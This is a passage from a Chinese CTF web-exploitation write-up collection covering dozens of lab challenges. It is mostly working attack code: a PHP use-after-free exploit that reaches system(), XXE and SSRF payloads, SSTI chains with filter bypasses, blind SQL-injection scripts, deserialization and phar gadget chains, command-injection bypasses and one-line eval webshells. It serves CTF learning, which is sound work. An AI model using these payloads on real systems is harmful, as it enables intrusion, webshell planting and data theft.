$data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; class ryat &#123; var $ryat; var $chtg; function __destruct() &#123; $this-&gt;chtg = $this-&gt;ryat; $this-&gt;ryat = 1; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; if(stristr(PHP_OS, 'WIN')) &#123; die('This PoC is for *nix systems only.'); &#125; $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_repeat('A', 79); $poc = 'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:\"ryat\":2:&#123;s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(\"UAF failed\"); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(\"Couldn't determine binary base address\"); &#125; if(!($elf = parse_elf($base))) &#123; die(\"Couldn't parse ELF header\"); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(\"Couldn't get basic_functions address\"); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(\"Couldn't get zif_system address\"); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; 然后在命令执行点包含shell.php即可获得flag 1include('/tmp/shell.php');base64编码之后得到：aW5jbHVkZSgnL3RtcC9zaGVsbC5waHAnKTs= [BJDCTF 2nd]假猪套天下第一DS_Store泄露 1python2 ds_store_exp.py http://node3.buuoj.cn:25749/. 看到有个L0g1n.php访问一下 1Sorry, this site will be available after totally 99 years! 修改头部 12345678910111213GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:25749User-Agent: Commodore 64Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: gem-love.comClient-ip:127.0.0.1From:root@gem-love.comVia: y1ng.vipCookie: time=16087393622222222225; PHPSESSID=se1334rkn9800qh7bk8dtnpn64Upgrade-Insecure-Requests: 1 相关头部信息 [NCTF2019]Fake XML cookbookxxe漏洞 file 协议读取flag 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY penson SYSTEM \"file:///flag\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt; [ASIS 2019]Unicorn shop买第四个商品了 考点unicode编码安全问题 我们可以用别的语言来表示数字 搜uncode大于1337的字符https://www.compart.com/en/unicode/search?q=thousand#characters直接搜thousand，会有一大堆 1id=4&amp;price=%E2%86%82 [SUCTF 2019]Pythonginx题目源码 123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" 解题 12345678910# coding:utf-8 for i in range(128,65537): tmp=chr(i) try: res = tmp.encode('idna').decode('utf-8') if(\"-\") in res: continue print(\"U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; \".format(tmp, res, i)) except: pass 在这里插入图片描述Nginx 重要文件目录 配置文件存放目录：/etc/nginx主要配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginxNginx配置文件：/usr/local/nginx/conf/nginx.conf 12file://suctf.cℭ/usr/local/nginx/conf/nginx.conffile://suctf.cℭ/usr/fffffflag [0CTF 2016]piapiapia反序列化字符逃匿，字符变长注册账户登录账户随意提交一些资料抓包修改nickname为nickname[]，数组绕过strlen()长度检测修改nickname中的内容 12345678910111213141516171819202122232425262728&lt;?phpfunction getSerialize()&#123; $profile['phone'] = '111111111111'; $profile['email'] = \"11112@qq.com\"; $profile['nickname'] = array(\"sdddd\" ); $profile['photo'] = 'config.php'; return serialize($profile);&#125;function getPayload()&#123; $s='\";&#125;s:5:\"photo\";s:10:\"config.php\";&#125;'; $len=strlen($s); $result=\"\"; $padding=\"where\"; for($i=0;$i&lt;$len;$i++)&#123; $result.=$padding; &#125; $result.=$s; return $result;&#125;print(getSerialize());print(\"\\n\");print(getPayload());#a:4:&#123;s:5:\"phone\";s:12:\"111111111111\";s:5:\"email\";s:12:\"11112@qq.com\";s:8:\"nickname\";a:1:&#123;i:0;s:5:\"sdddd\";&#125;s:5:\"photo\";s:10:\"config.php\";&#125;#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";&#125;s:5:\"photo\";s:10:\"config.php\";&#125; ?&gt; [BJDCTF2020]Cookie is so stable在user处尝试注入 1234567&#123;&#123;7*'7'&#125;&#125; 回显7777777 ==&gt; Jinja2&#123;&#123;7*'7'&#125;&#125; 回显49 ==&gt; Twig ``` 这里为Twig获取flag```bash&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;&#123;&#123;_self.env.getFilter(\"cat /flag\")&#125;&#125; [WesternCTF2018]shrine123456789101112131415import flaskimport os app = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@ app.route('/')def index(): return open(__file__).read()@ app.route('/shrine/')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ =='__main__': app.run(debug = True) 这里过滤了括号，所以__subclasses__ 就无法使用，其中黑名单处理会将config和self替换为None,不过可以使用其他全局变量，再来引用config,如url_for()和get_flashed_messages() 12&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; [SWPU2019]Web1报错了一通fuzz，or等被过滤，即无法使用information_schema库，可以使用无列名注入构造 1-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 手动探测列数，这里探测到有22列，回显位为2和3查表名时由于过滤or，所以information_schema无法使用。但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名 1-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 无列名注入 1-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 [2019]easy_serialize_php反序列化字符逃匿，字符减少由 phpinfo 的 auto_append_file 中得知 flag 的位置 /d0g3_fllllllag 12/index.php?f=show_imagepost: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:8:\"function\";s:4:\"test\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";&#125; [BSidesCF 2020]Had a bad day读取index.php 1/index.php?category=php://filter/read=convert.base64-encode/resource=index index 123456789101112$file = $_GET['category'];if(isset($file))&#123; if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\"))&#123; include ($file . '.php'); &#125; else&#123; echo \"Sorry, we currently only support woofers and meowers.\"; &#125;&#125; 得去flag.php 1/index.php?category=php://filter/read=convert.base64-encode/resource=meowers/../flag [BJDCTF 2nd]简单注入hint.txt 123456Only u input the correct password then u can get the flagand p3rh4ps wants a girl friend.select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]';//出题人四级压线才过 见谅见谅 领会精神 fuzz过滤的字符 1['--', '&amp;', \"'\", 'and', 'like', 'select', '-~', ';', '=', '\"', 'union', 'mid'] 注入点 1select * from users where username='admin\\' and password='or 1#'; 这时的后台语句变成这样的，用反斜杠转义username后面那个单引号，所以username的第一个单引号只能与password的第一个单引号闭合，最后一个单引号被注释，所以or后面那块就可以由我们自由发挥了。 1234567891011121314151617181920212223import requestsimport mathurl='http://ff2e7e0b-61b7-45a5-927d-1a759757182e.node3.buuoj.cn/'flag=''for i in range(1, 32): high=128 low=32 mid=math.floor((high+low)/2) while low&lt;high: payload = \"or(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;)#\".format(i, mid) data = &#123;\"username\": \"admin\\\\\", \"password\": payload&#125; re = requests.post(url, data=data) if \"stronger\" in re.text: low=mid+1 else : high=mid mid=math.floor((high+low)/2) if (low == 32 or high == 128): break flag += chr(mid) print(flag) 不过没注入出正确的密码有点奇怪 [WUSTCTF2020]朴实无华robots.txt 得知 fAke_f1agggg.php 文件，访问一个假flag，响应头部有提示 fl4g.php文件 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\"; &#125;else&#123; die(\"金钱解决不了穷人的本质问题\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");&#125;else&#123; die(\"去非洲吧\");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \"))&#123; $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\"; system($get_flag); &#125;else&#123; die(\"快到非洲了\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;?&gt; level1 1intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021 这里传入num=1e7即可。在进行intval($num)时被截断成为1，1&lt;2020 =&gt; True;而$num+1时就解析为科学技术法，结果是10000001（也不知道位数对不对，随意啦）。绕过了。 level2 1$md5=$_GET['md5']; 一般绕过md5的方法有两种，一个是以0e开头，后面全是数字的结果，这个会被解析为科学计数法为0；另一个是利用数组绕过。这里利用0e绕过： 1md5('0e215962017') ==&gt; “0e291242476940776845150308577824” get flag这里是个RCE，过滤了空格和cat。空格用%09(tab)绕过，cat用反斜杠绕过，构造成ca\\t: 1fl4g.php?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [网鼎杯 2020 朱雀组]Nmap回显hacker，经查，php被过滤，使用短标签绕过 1' &lt;?= @eval($_POST[\"hack\"]);?&gt; -oG hack.phtml ' [极客大挑战 2019]FinalSQL[MRCTF2020]PYWebsite前端验证，直接访问/flag.php 123456789101112131415161718function enc(code)&#123; hash = hex_md5(code); return hash;&#125;function validate()&#123; var code = document.getElementById(\"vcode\").value; if (code != \"\")&#123; if(hex_md5(code) == \"0cd4da0223c0b280829dc3ea458d655c\")&#123; alert(\"您通过了验证！\"); window.location = \"./flag.php\" &#125;else&#123; alert(\"你的授权码不正确！\"); &#125; &#125;else&#123; alert(\"请输入授权码\"); &#125; &#125; 修改请求数据包头部X-Forwarded-For:127.0.0.1 [NCTF2019]True XML cookbook读取源码，发现file协议读没用，换php协议读 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY penson SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt; 没发现什么打内网,先读取/etc/hosts，我这里是没发现ip，看网上的writeup是存在个ip地址，爆破一下c端地址，其中访问一个ip地址即可得flag 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY penson SYSTEM \"http://173.10.47.11\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt; [NPUCTF2020]ReadlezPHP/time.php?source=查看源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = \"Y-m-d h:i:s\"; $this-&gt;b = \"date\"; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[\"data\"]); payload 1time.php?data=O:8:\"HelloPhp\":2:&#123;s:1:\"a\";s:15:\"eval($_GET[y]);\";s:1:\"b\";s:6:\"assert\";&#125;&amp;y=phpinfo(); [BJDCTF2020]EasySearchindex.php.swp 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(\"Content-Type: text/html;charset=utf-8\"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) &#123; $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) &#123; echo \"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; &#125; else &#123; echo \"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;\"; &#125;else &#123; *** &#125; ***?&gt; ssi注入漏洞：https://blog.csdn.net/qq_40657585/article/details/84260844 [BJDCTF 2nd]xss之光/.git/源码泄露index.php 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); 反序列化之PHP原生类的利用:https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html [CISCN2019 华北赛区 Day1 Web2]ikunjwt 弱秘钥 ，pickle反序列化漏洞 [MRCTF2020]Ezpop这里算是学到一个知识点，嵌套定义一个类，就可以调用__construct(). 思路如下： 1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发__get()魔术方法。将Modifier这个类变成一个函数，从而调用__invoke()方法，进而调用include()函数 2.让source 等于对象，进而触发__toString方法，输出内容 exp 12345678910111213141516171819202122232425&lt;?phpclass Modifier &#123; protected $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";&#125;class Test&#123; public $p; &#125;class Show&#123; public $source; public $str; public function __construct()&#123; $this-&gt;str = new Test(); &#125;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a)); [CISCN2019 华北赛区 Day1 Web1]Dropbox存在任意文件下载 思路如下: 上传一个phar文件，后缀为图片的格式然后在delete.php中访问它，以phar://test.jpg的形式，此时会调用file-&gt;open()中的file_exists()会触发反序列化，（此时file_exists()返回的是false）此时只有user的__descruct会调用close()函数，但是没有回显功能，我们只能找一个有回显的地方进行序列化我们观察到FileList类的__descruct有echo函数，输出$table，而$table的内容来自$result，我们再来看一下__call函数 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; __call函数是指当调用类不存在的方法时就会调用__call函数其中$func就是指我们调用的不存在方法，而$args是指我们的参数，通过代码我们知道假如我们调用close()方法，那么最后会调用 1$file-&gt;$func() 即$file-&gt;close()，并且存入$result中，那么file_get_contents的内容就能回显出来了~~ 最后的payload为： 123456789101112131415161718192021222324252627282930&lt;?phpclass User &#123; public $db;&#125;class File&#123; public $filename = '/flag.txt';&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $this-&gt;files = array(new File()); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;$o = new User();$o-&gt;db =(new FileList());echo serialize($o);$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; 最后再说一下，为什么我们要通过delete.php触发phar反序列化，而不是通过download.php，两者都会调用file_exists()，那是因为download.php有base_dir限制，我们不能读出在/目录下的文件 [GYCTF2020]FlaskAppssti模板注入读取app.py文件内容 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 得知waf 1234567891011def waf(str): black_list = [ &amp; #34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp; #34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp; #34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp; #34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp; #34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;] for x in black_list: if x in str.lower(): return 1@ app.route( &amp;#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;]) 字符串拼接绕过，listdir列出文件 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 倒序绕过 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 拼接绕过 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; [GKCTF2020]老八小超市儿后台admin.php账户密码：admin shopxo 接下来就在应用中心里的应用商店找到主题，然后下载默认主题。在_static_里面加上一个test.php，这里面就是我们加入的一句话了，加个phpinfo（）可以方便确认马到底有没有穿上去。在/public/static/index/default/test.php ，打开验证一下。连接成功后发现目录里有flag和flag.hint打开flag里面是假flag ，然后尝试的打开root目录，发现权限不够 打开这个标红的auto.sh，发现他60秒运行一次makeflaghint.py的脚本，makeflaghint.py有权限修改，添加os.system(&quot;cat /root/flag &gt; /1.txt&quot;),过一分钟后即可得flag [CISCN2019 华东南赛区]Web11smarty模板注入 [GWCTF 2019]枯燥的抽奖PHP mt_rand安全杂谈及应用场景详解check.php 12345678910111213141516171819202122232425262728293031iNoUoNVRYN&lt;?php#这不是抽奖程序的源代码！不许看！header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num']))&#123; if($_POST['num']===$str)&#123;x echo \"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;\"; &#125; else&#123; echo \"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;\"; &#125;&#125;show_source(\"check.php\"); [极客大挑战 2019]RCE ME1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die(\"This is too Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 构造取反连接蚁剑 12345678&lt;?php$a='assert';echo urlencode(~$a).\"\\n\";$b='(eval($_POST[y]))';echo urlencode(~$b).\"\\n\";#%9E%8C%8C%9A%8D%8B#%D7%9A%89%9E%93%D7%A0%AF%B0%AC%AB%A4%86%A2%D6%D6?&gt; 一句话 12?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%86%A2%D6%D6);密码：y 看到根目录下存在flag和readflag文件.应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了。可以通过蚁剑的绕过disable_functions来执行这里选择PHP_GC_UAF [WUSTCTF2020]颜值成绩查询输入1 成绩100输入2 成绩666输入2-1 成绩100 123456789101112131415161718192021222324252627282930313233import requestsurl= 'http://763ada9b-220d-4dcb-b0e5-2f4a21bd2544.node3.buuoj.cn/'database =\"\"payload1 = \"?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1\" #库名为ctfpayload2 = \"?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),&#123;&#125;,1))&gt;&#123;&#125;)^1\"#表名为flag,scorepayload3 =\"?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;&#125;,1))&gt;&#123;&#125;)^1\" #列名为flag,valuepayload4 = \"?stunum=(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)\" #for i in range(35,10000): low = 32 high = 128 mid =(low + high) // 2 while(low &lt; high): # payload = payload1.format(i,mid) #查库名 # payload = payload2.format(i,mid) #查表名 # payload = payload3.format(i,mid) #查列名 payload = payload4.format(i,mid) #查flag new_url = url + payload r = requests.get(new_url) # print(new_url) if \"Hi admin\" in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database)print(database) [MRCTF2020]套娃查看源码 1234567891011121314151617&lt;!--//1st$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo \"you are going to the next ~\";&#125;!--&gt;``` [利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html) PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：```bash1.删除空白符2.将某些字符转换为下划线（包括空格） 可以用%20代替下划线从而绕过第一个if第二个if中正则匹配表示匹配字符窜的开头和结尾由于在字符窜中换行可以表示字符窜的结尾，所以可以用%0a(换行符的url编码)绕过 1?b%20u%20p%20t=23333a 访问secrettw.php 解码jsfuck，得到alert(“post me Merak”post Merak 得到源码 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo 'Local access only!'.\"&lt;br/&gt;\";$ip = getIp();if($ip!='127.0.0.1')echo \"Sorry,you don't have permission! Your ip is :\".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo \"Your REQUEST is:\".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt; 反写chnage 12345678910111213141516&lt;?phpfunction unchange($v)&#123; $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re; &#125;$real_flag = unchange('flag.php');echo base64_encode($real_flag);?&gt; 最终payload 1234?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=http头Client-ip : 127.0.0.1 [BSidesCF 2019]Kookie用题目提供的用户密码cookie / monster 登陆，查看cookie，将username修改为admin [CISCN2019 总决赛 Day2 Web1]Easyweb访问robots.txt，得知有bak备份image.php.bak 123456789101112131415161718&lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); addslashes()函数，这个函数会把特殊的字符转义。 比如:单引号会被转义成&#39;,斜杠会转义为\\. 第十行的str_replace会把”\\0”,”%00”,”\\‘“,”‘“中的任意一个替换成空。 我们可根据这个绕过当传入id=\\0时，就会在 查询语句处改变sql语句。 即:select * from images where id=’ &#39; or path=’+{$path}’ 所以我们可以在path处注入我们的新语句， 由于没有查询结果回显，所以此处是盲注 12345678910111213141516171819202122232425import requestsurl = \"http://18d42f36-2704-43a9-8690-b52a3c0a95e8.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or 1=\"result = \"\"last=\"tmp\"i=0while( last != result ): i=i+1 head=32 tail=127 while head &lt; tail : mid = ( head + tail ) &gt;&gt; 1 #payload = \"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) #payload = 